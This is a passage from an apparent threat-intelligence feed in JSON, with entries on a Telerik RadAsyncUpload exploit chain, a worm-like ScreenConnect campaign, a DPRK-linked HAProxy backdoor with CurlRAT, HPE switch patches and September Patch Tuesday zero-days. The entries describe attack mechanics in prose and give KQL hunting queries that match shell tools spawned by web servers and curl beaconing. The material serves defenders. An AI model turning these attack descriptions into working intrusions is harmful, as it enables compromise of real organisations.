  "eyebrow": "Telerik UI for ASP.NET AJAX · CVE-2026-13181 / -13182 / -13183 / -13184 · Public exploit Sep 7, 2026",
  "title": "A patched July chain becomes a runnable attack path in September",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "high",
    "Government Facilities"
   ]
  ],
  "overview": "Nothing about the vulnerability changed on Sep 7; what changed is that a complete, runnable attack path is now public. Progress fixed the chain on Jul 8 and published the CVEs on Jul 22, so organisations that patched in July are not exposed. The exposure sits with the long tail of ASP.NET WebForms applications that carry Telerik UI as a bundled third-party control, often in software that is maintained by a vendor rather than by the operator, and often with no inventory entry under the Telerik name. Two conditions narrow the blast radius honestly: the affected page must use RadAsyncUpload, and its server-side FileUploaded handler must read the UploadResult property. That is a non-default configuration, and reporting notes no confirmed exploitation in the wild. Weighed against that, Telerik's history — the 2019 RadAsyncUpload deserialisation flaw remained a reliable entry point for years — argues for treating the tooling release as the start of the exploitation window rather than an academic disclosure.",
  "technical": [
   "CVE-2026-13182: AES-CBC padding oracle in RadAsyncUpload's handling of encrypted client-controlled state. The code behaves differently when ciphertext has invalid padding than when padding is valid but the plaintext is malformed JSON, which lets an attacker infer plaintext and construct chosen ciphertext without the key.",
   "CVE-2026-13183: timing-based variant of the same oracle, usable when detailed errors are hidden.",
   "CVE-2026-13181: Telerik resolves the .NET type name supplied in AsyncUploadTypeName without an allowlist. If a server-side FileUploaded handler reads the UploadResult property, Telerik deserializes attacker-controlled data into the named type.",
   "Execution: chained with the System.Configuration.Install.AssemblyInstaller gadget, the application loads an uploaded mixed-mode DLL from a temporary directory and executes native code through its DllMain entry point.",
   "CVE-2026-13184: predictable default key. It applies only to an alternative attack mode that the released demonstration did not use.",
   "Attack technique detail: TantoSec used a CBC forgery introducing a 'sacrificial' encrypted block within a JSON string, preserving configuration from legitimate page loads including session controls while inserting malicious entries.",
   "Released tooling: a command-line tool named telerik-rau-exploit plus two mixed-mode DLL payloads — one writing a web shell to disk, one running entirely in memory (TantoSec's Marcio Almeida, Sep 7, 2026).",
   "Affected releases: 2010.1.309 through 2026.2.519. Fixed in 2026.2.708 (2026 Q2 SP1), released Jul 8, 2026, which replaces the flawed AES-CBC scheme with authenticated encryption and closes the whole chain.",
   "Second chain in the same July bulletin: RadPersistenceManager and RadDockLayout RCE (CVE-2026-13185, CVE-2026-13186, CVE-2026-13190), credited to CODE WHITE's Markus Wulftange and Progress. No public exploit has been released for it.",
   "No CVSS scores for the individual CVEs appeared in the sources reviewed."
  ],
  "iocs": [
   {
    "type": "Behavior",
    "value": "w3wp.exe spawning cmd.exe or powershell.exe on an IIS host running a Telerik WebForms application",
    "note": "Post-exploitation signal named in reporting of the chain"
   },
   {
    "type": "Behavior",
    "value": "DLL files appearing in IIS or ASP.NET temporary upload directories",
    "note": "The chain loads an uploaded mixed-mode DLL from a temporary directory"
   },
   {
    "type": "Behavior",
    "value": "Unexpected .aspx files written into web roots",
    "note": "One of the two released payloads writes a web shell to disk"
   },
   {
    "type": "Behavior",
    "value": "High-volume POST requests to Telerik.Web.UI.WebResource.axd with type=rau",
    "note": "The padding oracle requires many requests against the RadAsyncUpload handler to recover plaintext"
   },
   {
    "type": "Filename",
    "value": "telerik-rau-exploit",
    "note": "Name of the public command-line tool released by TantoSec — useful as a search term for tooling found on a host, not as a network indicator"
   }
  ],
  "iocNote": "No campaign indicators exist: this is a research and tooling release, not an observed intrusion, and reporting records no confirmed exploitation in the wild. The entries above are detection surfaces derived from the mechanism and from the remediation guidance published alongside the disclosure.",
  "mitigation": [
   "Upgrade to Telerik UI for ASP.NET AJAX 2026.2.708 (2026 Q2 SP1) or later. Progress calls upgrading its only official recommendation.",
   "Inventory by file, not by product name: search estates for Telerik.Web.UI.dll and Telerik.Web.UI.WebResource.axd handler registrations, since the control usually arrives inside a third-party application.",
   "Identify pages that use RadAsyncUpload and review their FileUploaded handlers for reads of the UploadResult property — that combination is what makes an application reachable through this chain.",
   "Do not rely on setting a stronger custom key as the fix: Progress warns that a custom key does not close the chain, and CVE-2026-13184 covers only the default-key mode.",
   "Where the application is vendor-maintained and cannot be upgraded quickly, restrict access to the RadAsyncUpload handler path at the reverse proxy and monitor it."
  ],
  "response": [
   "DEFENDER XDR KQL — the reliable signal is the outcome on the IIS host: the worker process spawning a shell, and DLLs or web shells appearing where uploads land. Technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// Telerik RadAsyncUpload chain — IIS worker escape and upload-directory artefacts\nlet since = datetime(2026-09-07);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName =~ \"w3wp.exe\"\n   | where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"rundll32.exe\",\"regsvr32.exe\",\"net.exe\",\"whoami.exe\")\n   | project Timestamp, DeviceName, Leg = \"IIS worker spawned shell\", Evidence = ProcessCommandLine),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName endswith \".dll\"\n   | where FolderPath has_any (@\"\\Temporary ASP.NET Files\\\", @\"\\AppData\\Local\\Temp\\\", @\"\\inetpub\\\")\n   | where InitiatingProcessFileName =~ \"w3wp.exe\"\n   | project Timestamp, DeviceName, Leg = \"DLL written by IIS worker\", Evidence = strcat(FolderPath, FileName)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName endswith \".aspx\" or FileName endswith \".ashx\"\n   | where FolderPath has @\"\\inetpub\\\"\n   | where InitiatingProcessFileName =~ \"w3wp.exe\"\n   | project Timestamp, DeviceName, Leg = \"web shell candidate in web root\", Evidence = strcat(FolderPath, FileName))\n| summarize Hits = count(), First = min(Timestamp), Last = max(Timestamp), Detail = make_set(Evidence, 8) by DeviceName, Leg\n| sort by Last desc",
   "SENTINEL KQL — a padding oracle is loud in IIS logs before it is loud on the endpoint: many requests to the RadAsyncUpload handler from one source, with mixed status codes.\n\n// Padding-oracle probing against Telerik.Web.UI.WebResource.axd\nlet since = datetime(2026-09-07);\nW3CIISLog\n| where TimeGenerated > since\n| where csUriStem has \"Telerik.Web.UI.WebResource.axd\" or csUriQuery has \"type=rau\"\n| summarize Requests = count(), Statuses = make_set(scStatus, 10), Paths = make_set(csUriStem, 5)\n    by cIP, sSiteName, bin(TimeGenerated, 15m)\n| where Requests > 100\n| sort by Requests desc",
   "If a hit is confirmed, treat it as server compromise rather than a file-upload incident: the chain ends in native code execution inside the IIS worker process, so review scheduled tasks, services and outbound connections from the host, and rotate application pool and connection-string credentials.",
   "Record the inventory result even where nothing is found. The durable value of this disclosure is knowing which applications in the estate ship Telerik UI, which is a question that will recur."
  ],
  "source": "TantoSec (Marcio Almeida) — Telerik RadAsyncUpload exploit chain write-up and telerik-rau-exploit release, Progress Software advisory (Jul 22, 2026), The Hacker News, CybersecurityNews, cyberpress.org, Cryptika",
  "sourceNote": "Jul 8 – Sep 7, 2026"
 },
 "screenconnectworm": {
  "eyebrow": "ConnectWise ScreenConnect · No CVE · Worm-like propagation · Huntress research Sep 3, 2026",
  "title": "A remote-support tool used as the transport, with no vulnerability in the chain",
  "tags": [
   [
    "high",
    "All Sectors"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "There is no CVE here, and that is the point: the initial access is social engineering, and the propagation uses ScreenConnect's own file-transfer capability working as designed. That makes patch state irrelevant and permission configuration decisive — ConnectWise's advice is to disable the TransferFiles and TransferFilesInSession permissions until a fix is prepared. The behaviour is unusually easy to hunt, because a legitimate ScreenConnect deployment does not repeatedly spawn wscript.exe to run numbered scripts out of its temporary directory. The worm-like element is what raises the priority: Huntress found the same four scripts on unrelated endpoints across different organisations, which means an environment can receive the payload from an already-compromised client it connects to, without anyone at that organisation being phoned by a fake help desk. Treat the presence of a second RMM tool such as UltraViewer on the same host as corroboration rather than coincidence.",
  "technical": [
   "Initial access: social engineering. In an Aug 20 incident the actor posed as technical support and instructed the victim to run Windows' built-in Quick Assist, took remote control, and installed a rogue ScreenConnect client. Huntress observed the same pattern in an Aug 24 attack.",
   "Execution: the rogue client repeatedly spawns wscript.exe to run four VBScript files named 1.vbs, 2.vbs, 3.vbs and 4.vbs from ScreenConnect temporary directories. Reporting describes the payload stages as reconnaissance, PowerShell execution and cleanup. In one incident five VBScript files were executed before defenders interrupted the activity.",
   "Propagation: previously installed, modified ScreenConnect clients can automatically transfer and execute the same four scripts on newly connected ScreenConnect endpoints — the worm-like chain Huntress identified when it examined the payloads.",
   "Persistence: a User Run Key named WindowsServiceHost pointing to WindowsServiceHost.vbs in the user's AppData directory.",
   "Secondary tooling: Huntress observed other RMM software, including UltraViewer, on some impacted hosts.",
   "Network: telemetry identified active connections from ScreenConnect to multiple remote IP addresses; the specific addresses were not published in the reporting reviewed.",
   "Vendor position: Huntress updated its post on Sep 3, 2026 following a ConnectWise advisory. ConnectWise advises disabling file transfer — the TransferFiles and TransferFilesInSession permissions — while a fix is prepared. No CVE has been assigned for the propagation behaviour."
  ],
  "iocs": [
   {
    "type": "Filename",
    "value": "1.vbs, 2.vbs, 3.vbs, 4.vbs",
    "note": "Executed by wscript.exe from ScreenConnect temporary directories; the defining artefact of the campaign (Huntress)"
   },
   {
    "type": "Filename",
    "value": "WindowsServiceHost.vbs",
    "note": "Persistence payload in the user's AppData directory"
   },
   {
    "type": "String",
    "value": "WindowsServiceHost",
    "note": "User Run Key name pointing to WindowsServiceHost.vbs — HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
   },
   {
    "type": "Behavior",
    "value": "ScreenConnect client process repeatedly spawning wscript.exe",
    "note": "Huntress notes this is highly abnormal for a legitimate ScreenConnect deployment"
   },
   {
    "type": "Behavior",
    "value": "UltraViewer installed on a host that already runs ScreenConnect",
    "note": "Secondary RMM observed on some impacted hosts"
   },
   {
    "type": "Behavior",
    "value": "Quick Assist (quickassist.exe) session immediately preceding a ScreenConnect installation",
    "note": "Initial-access pattern in the Aug 20 incident"
   }
  ],
  "iocNote": "No hashes, domains or IP addresses were published in the reporting reviewed — Huntress described network connections to multiple remote addresses without listing them, so no network indicators are recorded here. The script filenames are generic by design; hunt on the parent-child relationship and the Run key name rather than on the names alone.",
  "mitigation": [
   "Apply ConnectWise's advisory: disable the TransferFiles and TransferFilesInSession permissions in ScreenConnect until a fix is released.",
   "Inventory ScreenConnect instances, including ones installed outside IT's own deployment, and remove clients that no organisation owns.",
   "Restrict or block Quick Assist where it is not an operational requirement, since it was the entry point in the documented incident.",
   "Alert on installation of any RMM agent outside the approved deployment path — ScreenConnect, UltraViewer, AnyDesk and equivalents — rather than only on the ones currently in use.",
   "Brief service desks and end users on the tech-support pretext: the victim was instructed to start the remote-support session themselves.",
   "Where a rogue client is found, assume the host was a propagation source as well as a target and check every ScreenConnect endpoint that connected to it."
  ],
  "response": [
   "DEFENDER XDR KQL — the campaign's signature is structural: a remote-support binary as the parent of repeated wscript.exe executions, plus the named Run key. Technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// Rogue ScreenConnect clients — VBScript chain and WindowsServiceHost persistence\nlet since = datetime(2026-08-15);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (\"ScreenConnect\",\"connectwisecontrol\")\n   | where FileName in~ (\"wscript.exe\",\"cscript.exe\",\"powershell.exe\")\n   | project Timestamp, DeviceName, AccountName, Leg = \"ScreenConnect spawned script host\", Evidence = ProcessCommandLine),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where FileName =~ \"wscript.exe\"\n   | where ProcessCommandLine matches regex @\"[\\\\\\\\/][1-5]\\.vbs\"\n   | project Timestamp, DeviceName, AccountName, Leg = \"numbered VBScript execution\", Evidence = ProcessCommandLine),\n  (DeviceRegistryEvents\n   | where Timestamp > since\n   | where RegistryKey has @\"CurrentVersion\\Run\"\n   | where RegistryValueName has \"WindowsServiceHost\" or RegistryValueData has \"WindowsServiceHost.vbs\"\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Leg = \"Run key persistence\", Evidence = strcat(RegistryValueName, \" = \", RegistryValueData)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where FileName has_any (\"quickassist.exe\",\"UltraViewer\")\n   | project Timestamp, DeviceName, AccountName, Leg = \"remote-support tooling\", Evidence = strcat(FileName, \" \", ProcessCommandLine))\n| summarize Hits = count(), First = min(Timestamp), Last = max(Timestamp), Detail = make_set(Evidence, 8) by DeviceName, Leg\n| sort by Last desc",
   "SENTINEL KQL — the same chain in host event logs, plus unapproved RMM installation, for estates without an EDR connector on every endpoint.\n\n// ScreenConnect worm-like chain — process creation and service installation view\nlet since = datetime(2026-08-15);\nlet rmm = dynamic([\"ScreenConnect\",\"ConnectWiseControl\",\"UltraViewer\",\"AnyDesk\",\"quickassist\"]);\nunion isfuzzy=true\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where EventID == 4688\n   | where NewProcessName endswith \"wscript.exe\"\n   | where ParentProcessName has_any (rmm) or CommandLine matches regex @\"[\\\\\\\\/][1-5]\\.vbs\"\n   | project TimeGenerated, Host = Computer, Leg = \"script host from remote-support parent\", Evidence = strcat(Account, \": \", CommandLine)),\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where EventID == 4697\n   | where ServiceFileName has_any (rmm)\n   | project TimeGenerated, Host = Computer, Leg = \"RMM service installed\", Evidence = strcat(ServiceName, \" -> \", ServiceFileName)),\n  (DeviceProcessEvents\n   | where TimeGenerated > since\n   | where ProcessCommandLine has \"WindowsServiceHost.vbs\"\n   | project TimeGenerated, Host = DeviceName, Leg = \"persistence payload executed\", Evidence = ProcessCommandLine)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 6) by Host, Leg\n| sort by Last desc",
   "On a confirmed host, remove the Run key and the rogue client, then pivot on the ScreenConnect instance: identify every endpoint that connected through it, because propagation happens on connection rather than on user action.",
   "Reset credentials used during the remote session and review PowerShell execution in the same window — the reported payload stages include PowerShell execution and cleanup, so live artefacts may already have been deleted."
  ],
  "source": "Huntress — Rogue ScreenConnect Installations Across Unrelated Hosts Suggest Worm-Like Activity (John Hammond, Andrew Brandt, Lindsey O'Donnell-Welch), ConnectWise advisory, SecurityWeek, GBHackers, Cyberpresso, CloudLink",
  "sourceNote": "Sep 3 – Sep 7, 2026"
 },
 "dprkted": {
  "eyebrow": "DPRK-aligned · ted backdoor and CurlRAT · HAProxy 2.8.12 implant · Rapid7, Sep 7, 2026",
  "title": "A load balancer recompiled as a backdoor, sitting in the traffic path",
  "tags": [
   [
    "high",
    "Critical Manufacturing"
   ],
   [
    "high",
    "Communications"
   ]
  ],
  "overview": "The notable engineering choice here is where the implant lives. Rather than adding a process, the actor compiled a plugin into HAProxy itself and hooked the balancer's HTTP parser, using HAProxy's own filter API, memory pools, event scheduler and process management. Genuine load balancing continues to work, so the device behaves normally under monitoring while selected clients are redirected or served injected content. That places the compromise in a class of asset that most estates do not instrument for endpoint telemetry at all, and it means file-integrity checks against a stock HAProxy build are a more useful control than process listings. The 12-hour CurlRAT polling interval and the mimicry of Naver's pstatic.net domain are consistent with long-dwell espionage rather than smash-and-grab. Attribution is careful in the source: Rapid7 points to watering-hole techniques previously used by APT37 and Lazarus and to timeframe overlap with Operation SyncHole, and says a North Korean actor might be behind the campaign.",
  "technical": [
   "Toolkit: a HAProxy instance Rapid7 calls the 'ted backdoor', plus trojanized versions of agetty, atd, crond, polkitd and sshd. Capabilities are remote command execution, credential harvesting, and script injection into web traffic.",
   "ted backdoor: a custom HAProxy plugin compiled within the HAProxy source code, observed built as part of HAProxy 2.8.12 in the victim environment, hooked directly into the balancer's built-in HTTP parser. Rapid7: it 'uses its native filter API, internal memory pools, event scheduler, and process management infrastructure to intercept traffic and hide from monitoring, while genuine load balancing traffic operates as expected.'",
   "Initial access: exploitation of a vulnerability in a Groupware login portal on an edge server.",
   "Credential harvesting and lateral movement: an SSH keylogger, which also served as a staging server, enabled movement to internal systems.",
   "Deployment logic per Rapid7: 'The stager checks for the presence of either crond or HAProxy, and only then deploys CurlRAT, retrieving it either from its data section or the edge web server. In parallel, the ted backdoor is dropped onto the HAProxy load balancer.'",
   "CurlRAT: a curl-based RAT that polls its command-and-control server every 12 hours; it can decrypt and execute commands stored in its configuration, decode and write a new configuration payload to disk, and deploy a full interactive PTY shell.",
   "Traffic manipulation: once installed, the balancer redirects or serves malicious content to selected clients browsing through it, supporting cookie and session theft, credential theft and drive-by downloads, and hides evidence of the tampered page from a specific range of IPs to evade detection.",
   "Infrastructure: domains registered under low-cost commodity top-level domains; payload delivery blended into normal web browsing by mimicking Naver's pstatic.net static content domain.",
   "Longevity and attribution: likely in use since late 2024, when the HAProxy version involved was released. Artefacts and infrastructure point to watering-hole techniques previously used by APT37 and Lazarus, and the campaign timeframe overlaps Operation SyncHole, attributed to Lazarus last year."
  ],
  "iocs": [
   {
    "type": "Behavior",
    "value": "HAProxy binary that does not match the distribution package for its reported version (2.8.12 observed)",
    "note": "The backdoor is compiled into HAProxy itself; the process name and version string stay legitimate"
   },
   {
    "type": "Behavior",
    "value": "Modified or replaced agetty, atd, crond, polkitd or sshd binaries on a Linux host",
    "note": "Trojanized system utilities forming the rest of the toolkit (Rapid7)"
   },
   {
    "type": "Behavior",
    "value": "Outbound requests from a load balancer or edge server on a strict 12-hour cadence",
    "note": "CurlRAT polling interval"
   },
   {
    "type": "Behavior",
    "value": "Payload delivery from hostnames imitating Naver's pstatic.net static content domain",
    "note": "Traffic-blending technique; verify against Rapid7's published indicator list for the exact hostnames"
   },
   {
    "type": "Behavior",
    "value": "HTTP responses injected with script for a subset of clients while other clients receive the unmodified page",
    "note": "The balancer serves tampered content selectively and hides it from a specific range of IPs"
   },
   {
    "type": "Actor Alias",
    "value": "ted backdoor / CurlRAT",
    "note": "Rapid7's names for the HAProxy plugin implant and the curl-based RAT"
   }
  ],
  "iocNote": "No hashes, IP addresses or specific domains are recorded here — Rapid7's write-up was summarised in the reporting reviewed without an indicator table, and the source describes the infrastructure by pattern (commodity TLDs, pstatic.net mimicry) rather than by name. Pull the indicator list from Rapid7's own post before hunting on network artefacts.",
  "mitigation": [
   "Verify load balancer and edge-server binaries against distribution packages. A version string is not evidence of integrity when the backdoor is compiled into the source.",
   "Rebuild rather than clean any HAProxy instance where the plugin is found: the implant is part of the binary, and the trojanized system utilities alongside it mean the host's toolchain cannot be trusted.",
   "Patch and review Groupware and other web login portals on edge servers — that was the documented initial access.",
   "Rotate SSH keys and credentials that transited affected hosts, given the SSH keylogger used for credential harvesting.",
   "Instrument edge network devices for endpoint telemetry where possible, or at minimum for file integrity and outbound connection monitoring; these assets sit outside most EDR coverage.",
   "Compare content served to clients against content served from origin for a sample of sessions, since the injection is selective and invisible to a single test request."
  ],
  "response": [
   "DEFENDER XDR KQL — where Defender for Endpoint on Linux covers edge servers, hunt the binary changes and the fixed-cadence beacon rather than a process name; the implant reuses legitimate names throughout. Technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// ted backdoor / CurlRAT — system-binary tampering and fixed-interval beaconing\nlet since = ago(180d);\nlet sysbins = dynamic([\"haproxy\",\"agetty\",\"atd\",\"crond\",\"polkitd\",\"sshd\"]);\nunion isfuzzy=true\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName in~ (sysbins)\n   | where ActionType in (\"FileCreated\",\"FileModified\")\n   | where FolderPath startswith \"/usr/sbin\" or FolderPath startswith \"/usr/bin\" or FolderPath startswith \"/usr/local\"\n   | project Timestamp, DeviceName, Leg = \"system binary written\", Evidence = strcat(InitiatingProcessFileName, \" wrote \", FolderPath, FileName)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where FileName =~ \"curl\"\n   | where InitiatingProcessFileName in~ (\"crond\",\"haproxy\",\"sh\",\"bash\")\n   | project Timestamp, DeviceName, Leg = \"curl invoked by service process\", Evidence = strcat(InitiatingProcessFileName, \" -> \", ProcessCommandLine)),\n  (DeviceNetworkEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName in~ (\"haproxy\",\"curl\",\"crond\")\n   | summarize Calls = count(), Hours = dcount(bin(Timestamp, 1h)), Span = max(Timestamp) - min(Timestamp) by DeviceName, RemoteUrl, InitiatingProcessFileName\n   | where Calls >= 4 and Span > 2d\n   | project Timestamp = now(), DeviceName, Leg = \"low-and-slow beacon from edge service\", Evidence = strcat(InitiatingProcessFileName, \" -> \", RemoteUrl, \" x\", Calls))\n| summarize Hits = count(), Detail = make_set(Evidence, 8) by DeviceName, Leg\n| sort by DeviceName asc",
   "SENTINEL KQL — for estates where the balancer only reports syslog, look for HAProxy restarts and reloads that do not correspond to a change record, and for SSH sessions from the edge into internal systems.\n\n// Edge-server tampering and inbound-to-internal SSH pivot\nlet since = ago(180d);\nunion isfuzzy=true\n  (Syslog\n   | where TimeGenerated > since\n   | where ProcessName has \"haproxy\"\n   | where SyslogMessage has_any (\"Proxy\",\"reload\",\"new worker\",\"loading configuration\")\n   | summarize Reloads = count(), Times = make_list(TimeGenerated, 20) by Computer, bin(TimeGenerated, 1d)\n   | where Reloads > 2\n   | project TimeGenerated, Host = Computer, Leg = \"unexplained HAProxy reloads\", Evidence = strcat(Reloads, \" reloads in one day\")),\n  (Syslog\n   | where TimeGenerated > since\n   | where ProcessName == \"sshd\"\n   | where SyslogMessage has \"Accepted\"\n   | project TimeGenerated, Host = Computer, Leg = \"SSH accepted on edge host\", Evidence = SyslogMessage)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 6) by Host, Leg\n| sort by Last desc",
   "If a tampered balancer is confirmed, capture the binary and configuration for analysis before rebuilding, and treat every credential and session that passed through it as exposed — the implant is positioned to read and rewrite traffic in both directions.",
   "Check whether clients served by the balancer received injected script: the tampering is selective and hidden from a defined IP range, so testing from the SOC's own address range may show a clean page."
  ],
  "source": "Rapid7 — DPRK APTs' ted backdoor and CurlRAT target South Korean media and automotive sectors, SecurityWeek",
  "sourceNote": "Sep 7, 2026"
 },
 "hpeaoscx": {
  "eyebrow": "HPE Aruba Networking AOS-CX · CVE-2026-73749 · CVSS 9.8 · Patched Sep 4, 2026",
  "title": "Nearly two dozen switch-OS issues under a single identifier",
  "tags": [
   [
    "crit",
    "Communications"
   ],
   [
    "med",
    "Information Technology"
   ]
  ],
  "overview": "A routine but high-severity vendor release, recorded here for patch planning rather than for threat activity: no exploitation has been reported and no indicators were published. The detail worth noting is the packaging — nearly two dozen distinct issues carried under one CVE with one score, which is the same grouping practice seen in Cisco's September IOS XR bundle. One identifier no longer maps to one defect, so a severity-driven queue will not tell an operator how much work the ticket represents.",
  "technical": [
   "HPE released updates for AOS-CX, the network operating system on its Aruba Networking switching range.",
   "Nearly two dozen issues are tracked collectively as CVE-2026-73749, with a CVSS score of 9.8, described by SecurityWeek as critical remote code execution vulnerabilities.",
   "No exploitation has been reported in the sources reviewed, and no indicators of compromise were published.",
   "Reported by SecurityWeek on Sep 4, 2026."
  ],
  "iocs": [],
  "iocNote": "No indicators published: this is a vendor patch release with no reported exploitation.",
  "mitigation": [
   "Apply the AOS-CX updates from HPE Aruba Networking's advisories across the switching estate.",
   "Confirm management interfaces on AOS-CX switches are not reachable from user or internet-facing networks while the updates are scheduled.",
   "Read the advisory rather than the CVE record when scoping the work: one identifier covers nearly two dozen issues, so affected-feature detail sits in the vendor text."
  ],
  "response": [
   "SENTINEL KQL — AOS-CX switches carry no endpoint agent, so the only available telemetry is what the device sends to syslog. With no indicators published, the useful question is whether the management plane is being reached at all while the updates are scheduled.\n\n// AOS-CX management-plane access and configuration change\nlet since = ago(30d);\nunion isfuzzy=true\n  (Syslog\n   | where TimeGenerated > since\n   | where Facility in (\"local7\",\"auth\",\"authpriv\") or ProcessName has_any (\"cli\",\"hpe\",\"aruba\",\"aoscx\")\n   | where SyslogMessage has_any (\"USER LOGIN\",\"AUTH_FAIL\",\"login attempt\",\"ssh\",\"https-server\",\"REST\")\n   | extend SrcIp = extract(@\"(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\", 1, SyslogMessage)\n   | summarize Events = count(), Messages = make_set(SyslogMessage, 5) by Computer, SrcIp, bin(TimeGenerated, 1h)\n   | project TimeGenerated, Device = Computer, Leg = \"management-plane authentication\", Evidence = strcat(SrcIp, \" x\", Events)),\n  (Syslog\n   | where TimeGenerated > since\n   | where SyslogMessage has_any (\"configuration changed\",\"CONFIG\",\"checkpoint\",\"firmware\",\"image\")\n   | project TimeGenerated, Device = Computer, Leg = \"configuration or firmware change\", Evidence = SyslogMessage)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 6) by Device, Leg\n| sort by Last desc",
   "SENTINEL KQL — the practical compensating control is reachability, so confirm from firewall telemetry that switch management interfaces are not accepting sessions from user or internet-facing ranges.\n\n// Reachability of switch management interfaces\nlet since = ago(30d);\nlet mgmt = dynamic([\"10.255.\", \"192.168.255.\"]);   // replace with your own management ranges\nCommonSecurityLog\n| where TimeGenerated > since\n| where DestinationPort in (22, 23, 443, 830)\n| where DestinationIP has_any (mgmt)\n| where not(SourceIP has_any (mgmt))\n| summarize Sessions = count(), Ports = make_set(DestinationPort, 5), Allowed = make_set(DeviceAction, 5)\n    by SourceIP, DestinationIP, bin(TimeGenerated, 1d)\n| where Allowed has_any (\"allow\",\"permit\",\"accept\")\n| sort by Sessions desc",
   "There is no reported exploitation and no published indicators, so neither query is a detection for this CVE. Both exist to answer the exposure question while the updates are scheduled — read HPE's advisory for affected features, since one identifier covers nearly two dozen issues."
  ],
  "source": "HPE Aruba Networking security advisories, SecurityWeek",
  "sourceNote": "Sep 4, 2026"
 },
 "patchtuesdaysep": {
  "eyebrow": "Microsoft · September 2026 Patch Tuesday · CVE-2026-85880 + CVE-2026-81963 · Exploited zero-days · Sep 8, 2026",
  "title": "A record release where the two flaws under attack are both rated Important",
  "tags": [
   [
    "crit",
    "All Sectors"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "The volume is the story everyone will lead with, and it is the least useful part of it for triage. Both exploited flaws are rated Important, not Critical, and both score 7.8 — so a deployment ring gated on Critical severity would ship neither of them. Both are local privilege escalation, which means neither is an initial-access risk on its own; they matter as the second step of an intrusion that has already landed, and the ALPC flaw specifically as a way out of a low-privilege AppContainer sandbox with no user interaction required. Microsoft has published no exploitation detail, no actor and no targeting, and both are marked exploited but not publicly disclosed, so there are no indicators to hunt and version state is the whole position. The second thing worth carrying is that the headline number is not comparable between outlets: counts run from 966 to 996 depending on whether earlier-in-month cloud fixes and 25 republished non-Microsoft CVEs are included, and Critical counts vary from 105 to 121 on the same basis. Use your own Security Update Guide export rather than any published total to scope the work. ZDI's assessment of 20 wormable vulnerabilities — unauthenticated remote code execution without user interaction — is where the strategic risk sits, and none of those are known exploited today.",
  "technical": [
   "CVE-2026-85880 — heap buffer overflow in Windows Advanced Local Procedure Call (ALPC), local elevation of privilege, CVSS 7.8, rated Important, exploited in the wild. Microsoft: \"An attacker who can execute code in a low-privilege AppContainer could exploit this vulnerability locally to escape the sandbox and elevate privileges on the affected system. No additional user interaction is required.\" Tenable's Satnam Narang notes Microsoft has not patched an ALPC flaw since April 2023 and this is the second zero-day in the component in nearly four years, after CVE-2023-21674 in January 2023.",
   "CVE-2026-81963 — improper link resolution before file access (\"link following\") in the Windows Update Stack, local elevation of privilege to SYSTEM, CVSS 7.8, rated Important, exploited in the wild. Microsoft: \"Improper link resolution before file access ('link following') in Windows Update Stack allows an authorized attacker to elevate privileges locally.\" Credited to Romain Deperne and the Microsoft Threat Intelligence Centre. Narang notes it is the first Update Stack flaw flagged as a zero-day among seven resolved in the component over five years.",
   "Both zero-days are marked exploited but not publicly disclosed in the Security Update Guide export, and Microsoft has shared no detail on how either was used, by whom, or against which targets.",
   "Headline counts differ by what each outlet includes: 966 (BleepingComputer, Patch Tuesday only, excluding 204 fixed earlier in the month across Azure AI Language, Azure Cosmos DB, Copilot Studio, Entra ID, Mariner, Azure Active Directory B2C, Microsoft Discovery Studio, Microsoft Edge, Microsoft Fabric and Power Automate), 973 (CybersecurityNews, Cryptika, ntcompatible), 974 (SecurityWeek), 995 (Action1), 996 (securityonline.info). CybersecurityNews notes Microsoft separately lists 25 republished non-Microsoft CVEs that should not be folded into the total.",
   "Critical counts also vary: 105 (BleepingComputer, of which 81 RCE, 20 elevation of privilege, 2 information disclosure, 1 security feature bypass), 113 (ntcompatible), 119 (securityonline.info), 121 (Action1). securityonline.info reports 258 remote code execution flaws overall and 58 vulnerabilities Microsoft flagged as more likely to be exploited.",
   "ZDI's Dustin Childs assesses 20 of the resolved vulnerabilities as wormable — remote code execution without authentication or user interaction — and singles out CVE-2026-55007 (Exchange Server RCE), CVE-2026-80097 (Authenticator elevation of privilege), CVE-2026-69465 (SharePoint RCE), CVE-2026-65669 (SQL Server elevation of privilege) and CVE-2026-69525 (Remote Desktop Services RCE).",
   "Product splits as reported: 723 Windows, 62 SQL, 22 developer tools, 16 SharePoint Server, nine Exchange Server. Office is reported as 111 by CybersecurityNews and as 222 across the Office suite by SecurityWeek — the discrepancy is unresolved in the sources reviewed.",
   "Two Azure flaws reached CVSS 10.0: CVE-2026-70352 in Azure AI Language and CVE-2026-83711 in Azure Active Directory B2C. Help Net Security's pre-release forecast noted CVE-2026-65816 and CVE-2026-69555 in Azure Arc and CVE-2026-65801 in Exchange Server Online as cloud-side fixes Microsoft handled in its own operations.",
